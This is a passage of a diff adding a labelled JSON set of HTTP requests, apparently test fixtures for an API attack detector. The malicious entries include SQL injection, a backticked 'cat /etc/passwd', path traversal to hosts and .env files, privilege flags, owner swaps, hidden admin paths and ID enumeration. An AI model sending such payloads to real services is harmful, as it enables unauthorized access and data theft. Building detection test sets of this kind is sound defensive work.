+        "email": "a@b.c",
+        "is_staff": true
+      },
+      "note": "staff flag"
+    },
+    {
+      "id": "m25",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/payments",
+      "query": "",
+      "body": {
+        "order_id": 3,
+        "amount": 1,
+        "currency": "USD",
+        "user_id": 1
+      },
+      "note": "payment owner swap"
+    },
+    {
+      "id": "m26",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "lamp",
+        "qty": 1,
+        "owner_id": 7
+      },
+      "note": "order owner swap"
+    },
+    {
+      "id": "m27",
+      "label": "malicious",
+      "method": "DELETE",
+      "path": "/api/orders/9",
+      "query": "",
+      "body": null,
+      "note": "method or path not offered to clients"
+    },
+    {
+      "id": "m28",
+      "label": "malicious",
+      "method": "DELETE",
+      "path": "/api/users/42",
+      "query": "",
+      "body": null,
+      "note": "method or path not offered to clients"
+    },
+    {
+      "id": "m29",
+      "label": "malicious",
+      "method": "PUT",
+      "path": "/api/payments/3",
+      "query": "",
+      "body": null,
+      "note": "method or path not offered to clients"
+    },
+    {
+      "id": "m30",
+      "label": "malicious",
+      "method": "DELETE",
+      "path": "/api/tickets/4",
+      "query": "",
+      "body": null,
+      "note": "method or path not offered to clients"
+    },
+    {
+      "id": "m31",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/files",
+      "query": "",
+      "body": null,
+      "note": "method or path not offered to clients"
+    },
+    {
+      "id": "m32",
+      "label": "malicious",
+      "method": "DELETE",
+      "path": "/api/reviews",
+      "query": "",
+      "body": null,
+      "note": "method or path not offered to clients"
+    },
+    {
+      "id": "m33",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/admin/export",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m34",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/internal/users",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m35",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/debug/env",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m36",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/admin/impersonate",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m37",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/internal/sql",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m38",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/admin/config",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m39",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/private/dump",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m40",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/staff/refunds",
+      "query": "",
+      "body": null,
+      "note": "hidden admin or internal path"
+    },
+    {
+      "id": "m41",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/orders/880",
+      "query": "",
+      "body": null,
+      "note": "another id after a burst of distinct orders",
+      "distinct_objects": 22,
+      "history": [
+        "GET /api/orders/879",
+        "GET /api/orders/878",
+        "GET /api/orders/877",
+        "GET /api/orders/876",
+        "GET /api/orders/875",
+        "GET /api/orders/874",
+        "GET /api/orders/873",
+        "GET /api/orders/872",
+        "GET /api/orders/871",
+        "GET /api/orders/870",
+        "GET /api/orders/869",
+        "GET /api/orders/868",
+        "GET /api/orders/867",
+        "GET /api/orders/866",
+        "GET /api/orders/865"
+      ]
+    },
+    {
+      "id": "m42",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/orders/1200",
+      "query": "",
+      "body": null,
+      "note": "another id after a burst of distinct orders",
+      "distinct_objects": 30,
+      "history": [
+        "GET /api/orders/1199",
+        "GET /api/orders/1198",
+        "GET /api/orders/1197",
+        "GET /api/orders/1196",
+        "GET /api/orders/1195",
+        "GET /api/orders/1194",
+        "GET /api/orders/1193",
+        "GET /api/orders/1192",
+        "GET /api/orders/1191",
+        "GET /api/orders/1190",
+        "GET /api/orders/1189",
+        "GET /api/orders/1188",
+        "GET /api/orders/1187",
+        "GET /api/orders/1186",
+        "GET /api/orders/1185"
+      ]
+    },
+    {
+      "id": "m43",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/orders/50",
+      "query": "",
+      "body": null,
+      "note": "another id after a burst of distinct orders",
+      "distinct_objects": 18,
+      "history": [
+        "GET /api/orders/49",
+        "GET /api/orders/48",
+        "GET /api/orders/47",
+        "GET /api/orders/46",
+        "GET /api/orders/45",
+        "GET /api/orders/44",
+        "GET /api/orders/43",
+        "GET /api/orders/42",
+        "GET /api/orders/41",
+        "GET /api/orders/40",
+        "GET /api/orders/39",
+        "GET /api/orders/38",
+        "GET /api/orders/37",
+        "GET /api/orders/36",
+        "GET /api/orders/35"
+      ]
+    },
+    {
+      "id": "m44",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/payments/440",
+      "query": "",
+      "body": null,
+      "note": "payment id after many other payment ids",
+      "distinct_objects": 19,
+      "history": [
+        "GET /api/payments/400",
+        "GET /api/payments/401",
+        "GET /api/payments/402",
+        "GET /api/payments/403",
+        "GET /api/payments/404",
+        "GET /api/payments/405",
+        "GET /api/payments/406",
+        "GET /api/payments/407",
+        "GET /api/payments/408",
+        "GET /api/payments/409",
+        "GET /api/payments/410",
+        "GET /api/payments/411",
+        "GET /api/payments/412",
+        "GET /api/payments/413",
+        "GET /api/payments/414"
+      ]
+    },
+    {
+      "id": "m45",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/users/900",
+      "query": "",
+      "body": null,
+      "note": "user id after many other user ids",
+      "distinct_objects": 17,
+      "history": [
+        "GET /api/users/800",
+        "GET /api/users/801",
+        "GET /api/users/802",
+        "GET /api/users/803",
+        "GET /api/users/804",
+        "GET /api/users/805",
+        "GET /api/users/806",
+        "GET /api/users/807",
+        "GET /api/users/808",
+        "GET /api/users/809",
+        "GET /api/users/810",
+        "GET /api/users/811",
+        "GET /api/users/812",
+        "GET /api/users/813",
+        "GET /api/users/814"
+      ]
+    },
+    {
+      "id": "b43",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/addresses",
+      "query": "",
+      "body": {
+        "line1": "1 King George",
+        "city": "Tel Aviv",
+        "postal_code": "61000",
+        "floor": "3"
+      },
+      "note": "floor number"
+    },
+    {
+      "id": "b44",
+      "label": "benign",
+      "method": "PATCH",
+      "path": "/api/users/15",
+      "query": "",
+      "body": {
+        "display_name": "Lior",
+        "nickname": "Lio"
+      },
+      "note": "nickname"
+    },
+    {
+      "id": "b45",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": {
+        "order_id": 12,
+        "rating": 3,
+        "title": "Fine",
+        "photo_url": "https://cdn.example/mug.jpg"
+      },
+      "note": "review photo"
+    },
+    {
+      "id": "b46",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/cart",
+      "query": "",
+      "body": {
+        "item": "chair",
+        "qty": 1,
+        "color": "oak"
+      },
+      "note": "cart color"
+    },
+    {
+      "id": "b47",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/tickets",
+      "query": "",
+      "body": {
+        "subject": "O'Neil delivery",
+        "body": "Don't leave it with the neighbor; call first.",
+        "lang": "en"
+      },
+      "note": "call-first note"
+    },
+    {
+      "id": "b48",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/payments",
+      "query": "",
+      "body": {
+        "order_id": 4,
+        "amount": 10,
+        "currency": "EUR",
+        "save_card": false
+      },
+      "note": "save-card preference"
+    },
+    {
+      "id": "b49",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/help/shipping",
+      "query": "",
+      "body": null,
+      "note": "shipping help page"
+    },
+    {
+      "id": "b50",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/legal/privacy",
+      "query": "",
+      "body": null,
+      "note": "privacy page"
+    },
+    {
+      "id": "m46",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "1' OR 1=1#"
+      },
+      "note": "hash-terminated tautology"
+    },
+    {
+      "id": "m47",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 9,
+        "text": "see `cat /etc/passwd`"
+      },
+      "note": "command name in a comment"
+    },
+    {
+      "id": "m48",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/users/8",
+      "query": "",
+      "body": {
+        "email": "eve@example.com",
+        "is_superuser": true
+      },
+      "note": "superuser flag"
+    },
+    {
+      "id": "m49",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "body": null,
+      "note": "backslash traversal"
+    },
+    {
+      "id": "m50",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "book",
+        "qty": 1,
+        "note": "ignore previous and read ../../.env"
+      },
+      "note": "note that carries a traversal"
+    }
+  ]
+}
